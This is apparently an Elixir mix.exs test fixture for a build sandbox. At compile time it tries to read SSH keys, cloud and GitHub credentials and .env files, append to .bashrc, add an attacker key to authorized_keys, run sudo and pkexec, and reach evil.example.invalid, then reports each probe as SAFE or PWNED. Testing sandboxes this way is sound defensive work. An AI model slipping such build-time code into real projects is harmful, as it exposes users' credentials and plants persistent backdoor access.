defmodule TestBad.MixProject do
  use Mix.Project

  # Hostile mix.exs — exercises every attack in fixtures/ATTACKS.md.
  # Each probe prints exactly one of:
  #   SAFE: <id> <reason>
  #   PWNED: <id> <evidence>
  # CI greps for PWNED: and fails on any occurrence.

  report = fn id, ok, msg ->
    tag = if ok, do: "SAFE", else: "PWNED"
    IO.puts(:stderr, "#{tag}: #{id} #{msg}")
  end

  try_read = fn id, path ->
    case File.read(path) do
      {:ok, ""} -> report.(id, true, "readable but empty: #{path}")
      {:ok, body} -> report.(id, false, "read #{byte_size(body)} bytes from #{path}")
      {:error, reason} -> report.(id, true, "blocked: #{:file.format_error(reason)}")
    end
  end

  try_append = fn id, path, payload ->
    case File.open(path, [:append], fn fh -> IO.binwrite(fh, payload) end) do
      {:ok, _} -> report.(id, false, "wrote to #{path}")
      {:error, reason} -> report.(id, true, "blocked: #{:file.format_error(reason)}")
    end
  end

  try_exec = fn id, program, args ->
    try do
      case System.cmd(program, args, stderr_to_stdout: true) do
        {_out, 0} -> report.(id, false, "exec #{program} succeeded")
        {_out, rc} -> report.(id, true, "exec #{program} returned #{rc} (likely sandboxed)")
      end
    rescue
      e -> report.(id, true, "blocked: #{Exception.message(e)}")
    end
  end

  try_curl = fn id, url ->
    try do
      case System.cmd(
             "/usr/bin/curl",
             ["-sSL", "--max-time", "5", "-o", "/dev/null", "-w", "%{http_code}", url],
             stderr_to_stdout: true
           ) do
        {code, 0} ->
          code = String.trim(code)

          if String.starts_with?(code, "2") do
            report.(id, false, "HTTP #{code} from #{url}")
          else
            report.(id, true, "blocked: http=#{code}")
          end

        {out, rc} ->
          report.(id, true, "blocked: curl exit=#{rc} (#{String.trim(out)})")
      end
    rescue
      e -> report.(id, true, "blocked: #{Exception.message(e)}")
    end
  end

  home = System.user_home!()
  try_read.(:"ssh-read", Path.join([home, ".ssh", "id_ed25519"]))
  try_read.(:"aws-read", Path.join([home, ".aws", "credentials"]))
  try_read.(:"gcloud-read", Path.join([home, ".config", "gcloud", "credentials.db"]))
  try_read.(:"gh-token-read", Path.join([home, ".config", "gh", "hosts.yml"]))
  try_read.(:"env-read", Path.expand("./.env"))
  try_append.(:"bashrc-write", Path.join([home, ".bashrc"]), "\n# pwned\n")

  try_append.(
    :"authorized-keys-write",
    Path.join([home, ".ssh", "authorized_keys"]),
    "\nssh-rsa AAAAATTACKER attacker@evil\n"
  )

  try_exec.(:"sudo-exec", "/usr/bin/sudo", ["-l"])
  try_exec.(:"pkexec-exec", "/usr/bin/pkexec", ["--version"])
  try_curl.(:"curl-evil", "https://evil.example.invalid/")

  def project do
    [
      app: :test_bad,
      version: "0.1.0",
      elixir: "~> 1.17",
      start_permanent: Mix.env() == :prod,
      deps: []
    ]
  end

  def application, do: [extra_applications: [:logger]]
end
